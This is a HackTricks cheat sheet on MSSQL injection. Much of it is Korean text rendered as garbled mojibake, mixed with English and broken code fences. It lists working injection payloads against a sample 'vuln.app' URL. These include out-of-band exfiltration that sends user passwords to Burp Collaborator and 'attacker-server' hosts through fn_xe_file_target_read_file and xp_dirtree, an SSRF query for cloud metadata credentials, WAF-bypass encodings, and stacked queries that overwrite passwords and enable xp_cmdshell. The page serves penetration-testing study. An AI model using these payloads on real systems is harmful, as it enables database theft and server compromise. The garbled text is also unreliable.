# MSSQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Active Directory enumeration

ë‹¤ìŒ MSSQL í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ **MSSQL ì„œë²„ ë‚´ì—ì„œ SQL ì¸ì ì…˜ì„ í†µí•´ ë„ë©”ì¸ ì‚¬ìš©ìë¥¼ ë‚˜ì—´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**:

* **`SELECT DEFAULT_DOMAIN()`**: í˜„ì¬ ë„ë©”ì¸ ì´ë¦„ì„ ê°€ì ¸ì˜µë‹ˆë‹¤.
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: ë„ë©”ì¸ ì´ë¦„(_DOMAIN_ ì˜ˆì‹œ) ì„ ì•Œê³  ìˆë‹¤ë©´ ì´ í•¨ìˆ˜ëŠ” **ì‚¬ìš©ì Administratorì˜ SID**ë¥¼ 16ì§„ìˆ˜ í˜•ì‹ìœ¼ë¡œ ë°˜í™˜í•©ë‹ˆë‹¤. ì´ëŠ” `0x01050000000[...]0000f401`ê³¼ ë¹„ìŠ·í•˜ê²Œ ë³´ì¼ ê²ƒì´ë©°, **ë§ˆì§€ë§‰ 4ë°”ì´íŠ¸**ê°€ **big endian** í˜•ì‹ìœ¼ë¡œ **500**ì´ë¼ëŠ” ìˆ«ìë¼ëŠ” ì ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤. ì´ëŠ” **ì‚¬ìš©ì ê´€ë¦¬ì**ì˜ **ê³µí†µ ID**ì…ë‹ˆë‹¤.\
ì´ í•¨ìˆ˜ëŠ” **ë„ë©”ì¸ì˜ ID**ë¥¼ ì•Œ ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤(ë§ˆì§€ë§‰ 4ë°”ì´íŠ¸ë¥¼ ì œì™¸í•œ ëª¨ë“  ë°”ì´íŠ¸).
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : ì´ í•¨ìˆ˜ëŠ” **ì§€ì •ëœ IDì˜ ì‚¬ìš©ì ì´ë¦„**ì„ ë°˜í™˜í•©ë‹ˆë‹¤(ìˆëŠ” ê²½ìš°), ì´ ê²½ìš° **0000e803**ëŠ” big endian == **1000**ì…ë‹ˆë‹¤(ì¼ë°˜ì ìœ¼ë¡œ ì´ëŠ” ìƒì„±ëœ ì²« ë²ˆì§¸ ì¼ë°˜ ì‚¬ìš©ì IDì˜ IDì…ë‹ˆë‹¤). ê·¸ëŸ¬ë©´ 1000ì—ì„œ 2000ê¹Œì§€ ì‚¬ìš©ì IDë¥¼ ë¬´ì‘ìœ„ë¡œ ì¶”ì¸¡í•˜ì—¬ ë„ë©”ì¸ ì‚¬ìš©ìì˜ ëª¨ë“  ì‚¬ìš©ì ì´ë¦„ì„ ì–»ì„ ìˆ˜ ìˆë‹¤ê³  ìƒìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ë‹¤ìŒê³¼ ê°™ì€ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **ëŒ€ì²´ ì˜¤ë¥˜ ê¸°ë°˜ ë²¡í„°**

ì˜¤ë¥˜ ê¸°ë°˜ SQL ì¸ì ì…˜ì€ ì¼ë°˜ì ìœ¼ë¡œ `+AND+1=@@version--`ì™€ ê°™ì€ êµ¬ì¡°ì™€ Â«ORÂ» ì—°ì‚°ìë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•œ ë³€í˜•ì„ ë‹®ê³  ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ í‘œí˜„ì‹ì„ í¬í•¨í•˜ëŠ” ì¿¼ë¦¬ëŠ” ì¼ë°˜ì ìœ¼ë¡œ WAFì— ì˜í•´ ì°¨ë‹¨ë©ë‹ˆë‹¤. ìš°íšŒ ë°©ë²•ìœ¼ë¡œ, %2b ë¬¸ìë¥¼ ì‚¬ìš©í•˜ì—¬ íŠ¹ì • í•¨ìˆ˜ í˜¸ì¶œì˜ ê²°ê³¼ì™€ ë¬¸ìì—´ì„ ì—°ê²°í•˜ì—¬ ì›í•˜ëŠ” ë°ì´í„°ì— ëŒ€í•œ ë°ì´í„° ìœ í˜• ë³€í™˜ ì˜¤ë¥˜ë¥¼ ìœ ë°œí•©ë‹ˆë‹¤.

ì´ëŸ¬í•œ í•¨ìˆ˜ì˜ ëª‡ ê°€ì§€ ì˜ˆ:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

í•¨ìˆ˜ `USER_NAME()`ì˜ ì‚¬ìš© ì˜ˆ:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

ì´ SSRF íŠ¸ë¦­ì€ [ì—¬ê¸°ì—ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

### `fn_xe_file_target_read_file`

ì„œë²„ì—ì„œ **`VIEW SERVER STATE`** ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤.
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

**`CONTROL SERVER`** ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

ì´ê²ƒì€ **`CONTROL SERVER`** ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

`xp_dirtree`ì™€ ê°™ì€ ì €ì¥ í”„ë¡œì‹œì €ëŠ” Microsoftì— ì˜í•´ ê³µì‹ì ìœ¼ë¡œ ë¬¸ì„œí™”ë˜ì§€ëŠ” ì•Šì•˜ì§€ë§Œ, MSSQL ë‚´ì—ì„œ ë„¤íŠ¸ì›Œí¬ ì‘ì—…ì— ìœ ìš©í•˜ê¸° ë•Œë¬¸ì— ì˜¨ë¼ì¸ì—ì„œ ë‹¤ë¥¸ ì‚¬ëŒë“¤ì— ì˜í•´ ì„¤ëª…ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ í”„ë¡œì‹œì €ëŠ” ë‹¤ì–‘í•œ [ì˜ˆì œ](https://www.notsosecure.com/oob-exploitation-cheatsheet/)ì™€ [ê²Œì‹œë¬¼](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/)ì—ì„œ ë³´ì—¬ì¤€ ë°”ì™€ ê°™ì´ Out of Band Data exfiltrationì— ìì£¼ ì‚¬ìš©ë©ë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, `xp_dirtree` ì €ì¥ í”„ë¡œì‹œì €ëŠ” ë„¤íŠ¸ì›Œí¬ ìš”ì²­ì„ ìˆ˜í–‰í•˜ëŠ” ë° ì‚¬ìš©ë˜ì§€ë§Œ, TCP í¬íŠ¸ 445ë¡œë§Œ ì œí•œë©ë‹ˆë‹¤. í¬íŠ¸ ë²ˆí˜¸ëŠ” ìˆ˜ì •í•  ìˆ˜ ì—†ì§€ë§Œ, ë„¤íŠ¸ì›Œí¬ ê³µìœ ì—ì„œ ì½ëŠ” ê²ƒì„ í—ˆìš©í•©ë‹ˆë‹¤. ì‚¬ìš©ë²•ì€ ì•„ë˜ SQL ìŠ¤í¬ë¦½íŠ¸ì—ì„œ ë³´ì—¬ì§‘ë‹ˆë‹¤:
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
ì´ ë°©ë²•ì€ ê¸°ë³¸ ì„¤ì •ìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” `Windows Server 2016 Datacenter`ì—ì„œ `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)`ì™€ ê°™ì€ ëª¨ë“  ì‹œìŠ¤í…œ êµ¬ì„±ì—ì„œ ì‘ë™í•˜ì§€ ì•Šì„ ìˆ˜ ìˆë‹¤ëŠ” ì ì€ ì£¼ëª©í•  ë§Œí•©ë‹ˆë‹¤.

ë˜í•œ, ìœ ì‚¬í•œ ê²°ê³¼ë¥¼ ì–»ì„ ìˆ˜ ìˆëŠ” ëŒ€ì²´ ì €ì¥ í”„ë¡œì‹œì €ì¸ `master..xp_fileexist`ì™€ `xp_subdirs`ê°€ ìˆìŠµë‹ˆë‹¤. `xp_fileexist`ì— ëŒ€í•œ ì¶”ê°€ ì„¸ë¶€ì •ë³´ëŠ” ì´ [TechNet ê¸°ì‚¬](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.


### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

ëª…ë°±íˆ **`xp_cmdshell`**ì„ ì‚¬ìš©í•˜ì—¬ **SSRF**ë¥¼ ìœ ë°œí•˜ëŠ” ë¬´ì–¸ê°€ë¥¼ **ì‹¤í–‰**í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ë” ë§ì€ ì •ë³´ëŠ” í˜ì´ì§€ì˜ **ê´€ë ¨ ì„¹ì…˜ì„ ì½ì–´ë³´ì„¸ìš”**:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜ - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

CLR UDF(ê³µí†µ ì–¸ì–´ ëŸ°íƒ€ì„ ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜)ë¥¼ ìƒì„±í•˜ëŠ” ê²ƒì€ .NET ì–¸ì–´ë¡œ ì‘ì„±ëœ ì½”ë“œê°€ DLLë¡œ ì»´íŒŒì¼ë˜ì–´ MSSQL ë‚´ì—ì„œ ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ë¡œë“œë˜ëŠ” ê³¼ì •ìœ¼ë¡œ, `dbo` ì ‘ê·¼ì´ í•„ìš”í•©ë‹ˆë‹¤. ì´ëŠ” ì¼ë°˜ì ìœ¼ë¡œ ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²°ì´ `sa` ë˜ëŠ” ê´€ë¦¬ì ì—­í• ë¡œ ì´ë£¨ì–´ì§ˆ ë•Œë§Œ ê°€ëŠ¥í•˜ë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

ì´ì§„ íŒŒì¼ì„ CLR ì–´ì…ˆë¸”ë¦¬ë¡œ MSSQLì— ë¡œë“œí•  ìˆ˜ ìˆë„ë¡ [ì´ Github ì €ì¥ì†Œ](https://github.com/infiniteloopltd/SQLHttp)ì—ì„œ Visual Studio í”„ë¡œì íŠ¸ ë° ì„¤ì¹˜ ì§€ì¹¨ì´ ì œê³µë©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ MSSQL ë‚´ì—ì„œ HTTP GET ìš”ì²­ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ê¸°ëŠ¥ì˜ í•µì‹¬ì€ `http.cs` íŒŒì¼ì— ìº¡ìŠí™”ë˜ì–´ ìˆìœ¼ë©°, `WebClient` í´ë˜ìŠ¤ë¥¼ ì‚¬ìš©í•˜ì—¬ GET ìš”ì²­ì„ ì‹¤í–‰í•˜ê³  ì•„ë˜ì™€ ê°™ì´ ì½˜í…ì¸ ë¥¼ ê²€ìƒ‰í•©ë‹ˆë‹¤:
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
`CREATE ASSEMBLY` SQL ëª…ë ¹ì„ ì‹¤í–‰í•˜ê¸° ì „ì—, ë‹¤ìŒ SQL ìŠ¤ë‹ˆí«ì„ ì‹¤í–‰í•˜ì—¬ ì–´ì…ˆë¸”ë¦¬ì˜ SHA512 í•´ì‹œë¥¼ ì„œë²„ì˜ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì–´ì…ˆë¸”ë¦¬ ëª©ë¡ì— ì¶”ê°€í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤ ( `select * from sys.trusted_assemblies;`ë¥¼ í†µí•´ í™•ì¸ ê°€ëŠ¥):
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
ì–´ì…ˆë¸”ë¦¬ë¥¼ ì„±ê³µì ìœ¼ë¡œ ì¶”ê°€í•˜ê³  í•¨ìˆ˜ë¥¼ ìƒì„±í•œ í›„, ë‹¤ìŒ SQL ì½”ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ HTTP ìš”ì²­ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
### **ë¹ ë¥¸ ìµìŠ¤í”Œë¡œì‡: ë‹¨ì¼ ì¿¼ë¦¬ë¡œ ì „ì²´ í…Œì´ë¸” ë‚´ìš© ê°€ì ¸ì˜¤ê¸°**

[ì—¬ê¸°ì—ì„œ íŠ¸ë¦­](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)ì„ í™•ì¸í•˜ì„¸ìš”.

ë‹¨ì¼ ì¿¼ë¦¬ë¡œ í…Œì´ë¸”ì˜ ì „ì²´ ë‚´ìš©ì„ ì¶”ì¶œí•˜ëŠ” ê°„ê²°í•œ ë°©ë²•ì€ `FOR JSON` ì ˆì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ ì ‘ê·¼ ë°©ì‹ì€ "raw"ì™€ ê°™ì€ íŠ¹ì • ëª¨ë“œê°€ í•„ìš”í•œ `FOR XML` ì ˆì„ ì‚¬ìš©í•˜ëŠ” ê²ƒë³´ë‹¤ ë” ê°„ê²°í•©ë‹ˆë‹¤. `FOR JSON` ì ˆì€ ê°„ê²°ì„± ë•Œë¬¸ì— ì„ í˜¸ë©ë‹ˆë‹¤.

í˜„ì¬ ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ìŠ¤í‚¤ë§ˆ, í…Œì´ë¸” ë° ì—´ì„ ê°€ì ¸ì˜¤ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
```markdown
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
```

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
```markdown
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 Ğ¸Ğ»Ğ¸ %C2%A0:

```
```markdown
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```

A period instead of a whitespace between FROM and a column name:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```

\N separator between SELECT and a throwaway column:

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
SELECT 'a' SELECT 'b'
```

So for example, multiple queries such as:

```sql
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```
```

Can be reduced to:

```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# ëì— ì“¸ëª¨ì—†ëŠ” exec() ì¶”ê°€í•˜ì—¬ WAFê°€ ìœ íš¨í•œ ì¿¼ë¦¬ê°€ ì•„ë‹ˆë¼ê³  ìƒê°í•˜ê²Œ ë§Œë“¤ê¸°
admina'union select 1,'admin','testtest123'exec('select 1')--
## ì´ê²ƒì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# ì´ìƒí•˜ê²Œ êµ¬ì„±ëœ ì¿¼ë¦¬ ì‚¬ìš©í•˜ê¸°
admin'exec('update[users]set[password]=''a''')--
## ì´ê²ƒì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# ë˜ëŠ” xp_cmdshell í™œì„±í™”í•˜ê¸°
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## ì´ê²ƒì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

## References

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
